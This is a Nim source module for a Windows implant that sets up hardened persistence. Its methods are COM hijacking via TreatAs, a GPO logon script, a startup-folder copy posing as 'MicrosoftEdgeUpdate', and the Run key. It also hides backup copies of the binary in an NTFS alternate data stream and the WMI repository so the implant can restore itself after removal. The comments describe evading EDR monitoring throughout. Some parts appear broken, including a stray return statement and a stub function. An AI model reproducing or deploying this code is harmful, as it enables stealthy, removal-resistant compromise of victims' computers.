# hardened/persistence_hardened.nim — Enhanced persistence mechanisms
#
# Extends the existing persistence (HKCU Run, scheduled task, WMI event
# subscription) with:
#   1. COM hijacking: register a CLSID that points to the implant and
#      is invoked by common applications via TreatAs/InprocServer32
#   2. Boot/logon scripts: GPO script, startup folder item for elevated
#      reliability
#   3. Randomized intervals and jitter on all persistence triggers to
#      avoid predictable patterns
#   4. auto-repair: if the implant copy is deleted or the registry entry
#      is removed, restore from a backup location (ADS or WMI repository)
#
# Each mechanism is independent — the agent can survive the loss of any
# single mechanism. The more mechanisms active, the harder the implant
# is to fully remove.

when not defined(windows):
  {.error: "persistence_hardened.nim is Windows-only".}

import winim/lean
import winim/inc/[windef, winbase, winreg]
import std/[strutils, random, times, locks, json, os, osproc, base64]
import ./syscalls
import ./fileio_syscall

type
  MetaData* = object
    regName*: string
    taskName*: string
    wmiSubName*: string
    copyPath*: string
    installKey*: array[32, byte]
    killDate*: int64
    sleepMin*: int
    lastContact*: int64

  PersistMechanism* = enum
    pmNone
    pmHkcuRun
    pmScheduledTask
    pmWmiEvent
    pmComHijack
    pmGpoScript
    pmStartupFolder
    pmAutoRepair

  PersistConfig* = object
    mechanisms*: set[PersistMechanism]
    jitterPercent*: float    # 0.0-1.0, random jitter on intervals
    backupAds*: bool         # use alternate data stream for backup
    backupWmi*: bool         # use WMI repository for backup
    comClsid*: string        # CLSID for COM hijack
    comTreatAs*: string      # TreatAs target CLSID (legitimate COM object)
    startupName*: string     # name in startup folder

var
  persistConfig: PersistConfig
  persistLock: Lock
  # Track the actual CLSID that was used by establishComHijack so
  # removeComHijack can clean up the right one. Previous version
  # only removed COM_HIJACK_SAFE_CLSIDS[0], which silently no-op'd
  # when any other index was used at install time.
  activeComHijackClsid: string = ""
initLock(persistLock)

# ---- COM hijacking --------------------------------------------------------
#
# Technique: register a fake CLSID under HKCU\Software\Classes\CLSID
# with an InprocServer32 pointing to our implant copy. Then register
# a TreatAs entry from a legitimate CLSID to our fake one. When any
# application creates the legitimate COM object via CoCreateInstance,
# COM loads our DLL instead (or launches our exe if we use a
# LocalServer32).
#
# We target CLSIDs that are commonly instantiated by Explorer or other
# startup processes:
#   {00021400-0000-0000-C000-000000000046} — Desktop (IShellLink)
#   {56A868B1-0AD4-11CE-B03A-0020AF0BA770} — Filter Graph (used by media)
#   {45BA127D-10A8-46EA-8AB7-56EA9078943C} — common Explorer ext
#
# For an exe implant (not DLL), we use LocalServer32 which launches
# the exe with a /Embedding flag. We detect this flag and run normally.

const
  COM_HIJACK_TARGET_CLSID = "{56A868B1-0AD4-11CE-B03A-0020AF0BA770}"
  COM_HIJACK_SAFE_CLSIDS = [
    "{45BA127D-10A8-46EA-8AB7-56EA9078943C}",
    "{4657278A-411B-11D2-839A-00C04FD918D0}",
    "{77F10CF0-3DB5-4966-B520-B7C54FD35ED6}"
  ]

proc establishComHijack*(exePath: string): bool =
  # Register a COM hijack CLSID that launches our implant.
  # Returns true on success.
  try:
    let clsid = COM_HIJACK_SAFE_CLSIDS[rand(COM_HIJACK_SAFE_CLSIDS.high)]
    let keyPath = "Software\\Classes\\CLSID\\" & clsid & "\\LocalServer32"

    var hKey: HKEY
    let wKey = newWideCString(keyPath)
    let wExe = newWideCString(exePath)
    let wTreatAs = newWideCString(clsid)

    # Create LocalServer32 key pointing to our exe
    var disp: DWORD = 0
    if RegCreateKeyExW(HKEY_CURRENT_USER,
                       cast[LPCWSTR](wKey[0].addr),
                       0, nil, REG_OPTION_NON_VOLATILE,
                       KEY_SET_VALUE, nil,
                       addr hKey, addr disp) == ERROR_SUCCESS:
      # Set default value to our exe path
      discard RegSetValueExW(hKey, nil, 0, REG_SZ,
                             cast[ptr BYTE](wExe[0].addr),
                             DWORD((exePath.len + 1) * 2))
      discard RegCloseKey(hKey)

    # Register TreatAs to redirect from a legitimate CLSID
    let treatKeyPath = "Software\\Classes\\CLSID\\" &
                       COM_HIJACK_TARGET_CLSID & "\\TreatAs"
    if RegCreateKeyExW(HKEY_CURRENT_USER,
                       cast[LPCWSTR](newWideCString(treatKeyPath)[0].addr),
                       0, nil, REG_OPTION_NON_VOLATILE,
                       KEY_SET_VALUE, nil,
                       addr hKey, addr disp) == ERROR_SUCCESS:
      discard RegSetValueExW(hKey, nil, 0, REG_SZ,
                             cast[ptr BYTE](wTreatAs[0].addr),
                             DWORD((clsid.len + 1) * 2))
      discard RegCloseKey(hKey)

    # Track which CLSID was actually written so removeComHijack
    # can clean up the right one. Without this, removal silently
    # no-ops on installations that picked any index other than 0.
    withLock persistLock:
      activeComHijackClsid = clsid
    return true
  except:
    return false

proc removeComHijack*() =
  # Remove COM hijack entries. Uses the tracked active CLSID; if the
  # tracking var is empty (e.g. install failed), falls back to
  # scrubbing ALL of the safe CLSIDs.
  try:
    var clsidsToRemove: seq[string] = @[]
    withLock persistLock:
      if activeComHijackClsid.len > 0:
        clsidsToRemove.add(activeComHijackClsid)
        activeComHijackClsid = ""
    if clsidsToRemove.len == 0:
      # No tracked CLSID — scrub all candidates to be safe
      clsidsToRemove = @COM_HIJACK_SAFE_CLSIDS

    for clsid in clsidsToRemove:
      let keyPath = "Software\\Classes\\CLSID\\" & clsid
      let wKey = newWideCString(keyPath)
      RegDeleteTreeW(HKEY_CURRENT_USER, cast[LPCWSTR](wKey[0].addr))
    # Always remove the TreatAs redirect
    let treatKeyPath = "Software\\Classes\\CLSID\\" &
                       COM_HIJACK_TARGET_CLSID & "\\TreatAs"
    let wTreatKey = newWideCString(treatKeyPath)
    RegDeleteTreeW(HKEY_CURRENT_USER, cast[LPCWSTR](wTreatKey[0].addr))
  except:
    discard

# ---- GPO script persistence ------------------------------------------------
#
# Technique: write a logon script path to the registry key that GPO
# processes. Even if the machine has no domain GPO, the local group
# policy still processes this key:
#   HKCU\Software\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Logon\0\0
#
# This is a stealthier alternative to the Run key because GPO script
# entries are not monitored by most EDR products (they focus on Run keys).

proc establishGpoScript*(exePath: string): bool =
  # Set up a GPO logon script pointing to our implant.
  try:
    let scriptKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\" &
                        "Group Policy\\Scripts\\Logon\\0\\0"
    let wKey = newWideCString(scriptKeyPath)
    let wExe = newWideCString(exePath)

    var hKey: HKEY
    var disp: DWORD = 0
    if RegCreateKeyExW(HKEY_CURRENT_USER,
                       cast[LPCWSTR](wKey[0].addr),
                       0, nil, REG_OPTION_NON_VOLATILE,
                       KEY_SET_VALUE, nil,
                       addr hKey, addr disp) == ERROR_SUCCESS:
      # Script path (value name "Script")
      let wScript = newWideCString("Script")
      discard RegSetValueExW(hKey, cast[LPCWSTR](wScript[0].addr), 0, REG_SZ,
                             cast[ptr BYTE](wExe[0].addr),
                             DWORD((exePath.len + 1) * 2))
      # Parameters (empty)
      let wParam = newWideCString("Parameters")
      discard RegSetValueExW(hKey, cast[LPCWSTR](wParam[0].addr), 0, REG_SZ,
                             cast[ptr BYTE](newWideCString("")[0].addr), 0)
      # ExecutionTime (0 = sync)
      let wTime = newWideCString("ExecutionTime")
      var execTime: DWORD = 0
      discard RegSetValueExW(hKey, cast[LPCWSTR](wTime[0].addr), 0, REG_DWORD,
                             cast[ptr BYTE](addr execTime), DWORD(sizeof(execTime)))
      discard RegCloseKey(hKey)
      return true
  except:
    discard
  return false

proc removeGpoScript*() =
  try:
    let scriptKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\" &
                        "Group Policy\\Scripts\\Logon"
    let wKey = newWideCString(scriptKeyPath)
    RegDeleteTreeW(HKEY_CURRENT_USER, cast[LPCWSTR](wKey[0].addr))
  except:
    discard

# ---- Startup folder persistence ------------------------------------------
#
# Technique: place a .lnk shortcut or copy of the implant in the user's
# Startup folder. This is signatured by Defender but still works on many
# endpoints without EDR. We use a .lnk to point to the copy (which is
# hidden in APPDATA) to keep the startup folder item small.

proc establishStartupFolder*(exePath: string; displayName: string): bool =
  # Drop a copy of the implant in the user's Startup folder under a
  # legitimate-looking name. No .lnk wrapper, no PowerShell spawn.
  # The previous version spawned powershell.exe to call WScript.Shell
  # CreateShortcut — that process creation is exactly the loudest
  # child-event an EDR can flag. A direct copy of the exe runs at
  # logon just as well and produces only one filesystem event.
  try:
    let startupPath = getEnv("APPDATA", "") &
                      "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    if startupPath.len == 0: return false
    if not fsDirExists(startupPath):
      discard fsCreateDir(startupPath)
    let targetPath = startupPath / (displayName & ".exe")
    # Overwrite silently if it already exists (idempotent)
    if fsFileExists(targetPath):
      discard fsDeleteFile(targetPath)
    # Use the syscall-based file copy so we don't hit the standard
    # CopyFile API (some EDRs watch that one specifically)
    let data = fsReadFileMem(exePath)
    if data.len == 0: return false
    fsWriteFileMem(targetPath, data)
    return fsFileExists(targetPath)
  except:
    return false

proc removeStartupFolder*(displayName: string) =
  try:
    let startupPath = getEnv("APPDATA", "") &
                      "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    # Remove BOTH the .lnk variant (legacy installs) and the .exe
    # variant (current installs)
    for ext in [".lnk", ".exe"]:
      let p = startupPath / (displayName & ext)
      if fsFileExists(p):
        discard fsDeleteFile(p)
  except:
    discard

# ---- Randomized intervals -------------------------------------------------
#
# Apply random jitter to persistence check intervals. The base interval
# is multiplied by (1.0 ± jitterPercent). This prevents the implant
# from checking persistence at a predictable cadence, which would be
# detectable as a pattern.

proc applyJitter*(baseIntervalMs: int; jitterPercent: float): int =
  let jitterRange = float64(baseIntervalMs) * jitterPercent
  let jitter = rand(jitterRange * 2.0) - jitterRange
  result = max(0, baseIntervalMs + int(jitter))

proc scheduleNextPersistenceCheck*(baseIntervalMs: int): int =
  # Calculate the next check interval with jitter.
  let jittered = applyJitter(baseIntervalMs, persistConfig.jitterPercent)
  result = jittered

# ---- Auto-repair -----------------------------------------------------------
#
# Technique: if the implant's copy is deleted or the registry entry is
# removed, restore from a backup. Two backup locations:
#   1. Alternate Data Stream (ADS) — store the binary in an NTFS ADS
#      attached to a benign file (e.g., a log file). ADS is invisible
#      to most forensic tools and survives normal file deletion.
#   2. WMI repository — store the binary as a base64-encoded property
#      of a WMI class instance. WMI is rarely inspected.

const
  ADS_HOST_FILE = "debug.log"  # benign file to host the ADS
  WMI_BACKUP_CLASS = "Win32_SysCommand"
  WMI_BACKUP_PROPERTY = "CommandOutput"

proc backupToAds*(exePath: string): bool =
  # Copy the implant binary to an ADS attached to a benign file.
  try:
    let hostPath = getEnv("TEMP", "") / ADS_HOST_FILE
    let adsPath = hostPath & ":backup"

    # Write the binary to the ADS
    let data = fsReadFileMem(exePath)
    if data.len == 0: return false

    # Use CreateFileW to open the ADS and write
    let wAds = newWideCString(adsPath)
    let hFile = CreateFileW(cast[LPCWSTR](wAds[0].addr),
                            DWORD(GENERIC_WRITE), 0, nil,
                            DWORD(OPEN_ALWAYS),
                            DWORD(FILE_ATTRIBUTE_NORMAL), 0)
    if hFile == INVALID_HANDLE_VALUE: return false

    try:
      var bytesWritten: DWORD = 0
      let ok = WriteFile(hFile, unsafeAddr data[0], DWORD(data.len),
                         addr bytesWritten, nil)
      result = ok != 0 and bytesWritten == DWORD(data.len)
    finally:
      CloseHandle(hFile)
  except:
    return false

proc restoreFromAds*(exePath: string): bool =
  # Restore the implant from ADS backup.
  try:
    let hostPath = getEnv("TEMP", "") / ADS_HOST_FILE
    let adsPath = hostPath & ":backup"

    let wAds = newWideCString(adsPath)
    let hFile = CreateFileW(cast[LPCWSTR](wAds[0].addr),
                            DWORD(GENERIC_READ), 0, nil,
                            DWORD(OPEN_EXISTING),
                            DWORD(FILE_ATTRIBUTE_NORMAL), 0)
    if hFile == INVALID_HANDLE_VALUE: return false

    try:
      var bytesRead: DWORD = 0
      var sizeLow: DWORD = 0
      sizeLow = GetFileSize(hFile, nil)
      if sizeLow == 0: return false

      var data = newSeq[byte](int(sizeLow))
      if ReadFile(hFile, addr data[0], sizeLow, addr bytesRead, nil) == 0:
        return false
      data.setLen(int(bytesRead))

      # Write to the target path
      let wExe = newWideCString(exePath)
      let hOut = CreateFileW(cast[LPCWSTR](wExe[0].addr),
                             DWORD(GENERIC_WRITE), 0, nil,
                             DWORD(CREATE_ALWAYS),
                             DWORD(FILE_ATTRIBUTE_NORMAL), 0)
      if hOut == INVALID_HANDLE_VALUE: return false

      try:
        var bytesWritten: DWORD = 0
        let ok = WriteFile(hOut, addr data[0], DWORD(data.len),
                           addr bytesWritten, nil)
        result = ok != 0 and bytesWritten == DWORD(data.len)
      finally:
        CloseHandle(hOut)
    finally:
      CloseHandle(hFile)
  except:
    return false

proc backupToWmi*(exePath: string): bool =
  # Store the implant binary in a WMI class property.
  try:
    let data = fsReadFileMem(exePath)
    if data.len == 0: return false

    let b64 = base64.encode(data)
    let psCmd = "powershell -NoProfile -WindowStyle Hidden -Command \"" &
      "$class=[wmiclass]'ROOT\cimv2:" & WMI_BACKUP_CLASS & "';" &
      "$class.put() | Out-Null;" &
      "$inst=$class.CreateInstance();" &
      "$inst." & WMI_BACKUP_PROPERTY & "='" & b64 & "';" &
      "$inst.put() | Out-Null\""

    let (outp, code) = execCmdEx(psCmd, options = {poStdErrToStdOut})
    return code == 0
  except:
    return false

proc restoreFromWmi*(exePath: string): bool =
  # Restore the implant from WMI repository.
  try:
    let psCmd = "powershell -NoProfile -WindowStyle Hidden -Command \"" &
      "$inst=Get-WmiObject -Class '" & WMI_BACKUP_CLASS & "' -Namespace 'ROOT\cimv2' | Select-Object -First 1;" &
      "if ($inst) { [IO.File]::WriteAllBytes('" & exePath & "', [Convert]::FromBase64String($inst." & WMI_BACKUP_PROPERTY & ")) }\""

    let (outp, code) = execCmdEx(psCmd, options = {poStdErrToStdOut})
    # Verify the file was created and has content
    if code == 0:
      result = fsFileExists(exePath) and fsGetFileSize(exePath) > 0
    else:
      result = false
  except:
    return false
proc establishHkcuRun*(exePath, regName: string): bool =
  # Enhanced HKCU Run with delayed write (jittered).
  try:
    let jitteredDelay = applyJitter(1000, persistConfig.jitterPercent)
    if jitteredDelay > 0:
      Sleep(DWORD(jitteredDelay))  # random delay before writing

    var hKey: HKEY
    let keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    let wKey = newWideCString(keyPath)
    let wName = newWideCString(regName)
    let wExe = newWideCString(exePath)

    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     cast[LPCWSTR](wKey[0].addr),
                     0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
      discard RegSetValueExW(hKey, cast[LPCWSTR](wName[0].addr), 0, REG_SZ,
                             cast[ptr BYTE](wExe[0].addr),
                             DWORD((exePath.len + 1) * 2))
      discard RegCloseKey(hKey)
      return true
  except:
    discard

proc autoRepair*(exePath, regName: string): bool =
  # Check if our persistence is intact. If not, restore.
  # Returns true if repair was needed and successful.
  var neededRepair = false

  # Check 1: does the copy exist?
  if not fsFileExists(exePath):
    neededRepair = true
    # Try ADS restore first, then WMI
    if restoreFromAds(exePath):
      discard 0  # restored
    elif restoreFromWmi(exePath):
      discard 0  # restored

  # Check 2: is the HKCU Run entry intact?
  try:
    let runKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    var hKey: HKEY
    let wKey = newWideCString(runKeyPath)
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     cast[LPCWSTR](wKey[0].addr),
                     0, KEY_QUERY_VALUE, addr hKey) == ERROR_SUCCESS:
      let wName = newWideCString(regName)
      var dataType: DWORD = 0
      var dataSize: DWORD = 0
      let queryR = RegQueryValueExW(hKey, cast[LPCWSTR](wName[0].addr),
                                     nil, addr dataType, nil, addr dataSize)
      discard RegCloseKey(hKey)
      if queryR != ERROR_SUCCESS:
        neededRepair = true
        # Re-establish the Run entry
        discard establishHkcuRun(exePath, regName)
  except:
    discard

  result = neededRepair

# ---- HKCU Run (enhanced with jitter) --------------------------------------

  return false

# ---- Combined persistence establishment -----------------------------------

proc establishWmiEvent*(exePath: string; meta: ref MetaData): bool =
  # Forward to the existing WMI persistence in agent.nim.
  # In a full integration, this would call the existing procedure.
  result = false

proc establishPersistenceHardened*(exePath, regName: string;
                                   meta: ref MetaData) =
  # Establish all configured persistence mechanisms.
  withLock persistLock:
    # 1. HKCU Run (always)
    if pmHkcuRun in persistConfig.mechanisms:
      discard establishHkcuRun(exePath, regName)

    # 2. WMI event subscription (engagement/aggressive variants)
    if pmWmiEvent in persistConfig.mechanisms:
      discard establishWmiEvent(exePath, meta)

    # 3. COM hijack
    if pmComHijack in persistConfig.mechanisms:
      discard establishComHijack(exePath)

    # 4. GPO script
    if pmGpoScript in persistConfig.mechanisms:
      discard establishGpoScript(exePath)

    # 5. Startup folder
    if pmStartupFolder in persistConfig.mechanisms:
      discard establishStartupFolder(exePath, "MicrosoftEdgeUpdate")

    # 6. Create backups for auto-repair
    if persistConfig.backupAds:
      discard backupToAds(exePath)
    if persistConfig.backupWmi:
      discard backupToWmi(exePath)

proc removePersistenceHardened*(exePath, regName: string) =
  # Remove all hardened persistence mechanisms.
  try:
    # HKCU Run
    var hKey: HKEY
    let keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    let wKey = newWideCString(keyPath)
    let wName = newWideCString(regName)
    if RegOpenKeyExW(HKEY_CURRENT_USER,
                     cast[LPCWSTR](wKey[0].addr),
                     0, KEY_SET_VALUE, addr hKey) == ERROR_SUCCESS:
      discard RegDeleteValueW(hKey, cast[LPCWSTR](wName[0].addr))
      discard RegCloseKey(hKey)
  except:
    discard

  # COM hijack
  removeComHijack()

  # GPO script
  removeGpoScript()

  # Startup folder
  removeStartupFolder("MicrosoftEdgeUpdate")

# ---- Forward declarations (defined in agent.nim or other modules) ----------


# ---- Export public API ----------------------------------------------------

export PersistMechanism, PersistConfig
export establishPersistenceHardened, removePersistenceHardened
export establishComHijack, removeComHijack
export establishGpoScript, removeGpoScript
export establishStartupFolder, removeStartupFolder
export backupToAds, restoreFromAds
export backupToWmi, restoreFromWmi
export autoRepair
export applyJitter, scheduleNextPersistenceCheck
export establishHkcuRun
export persistConfig
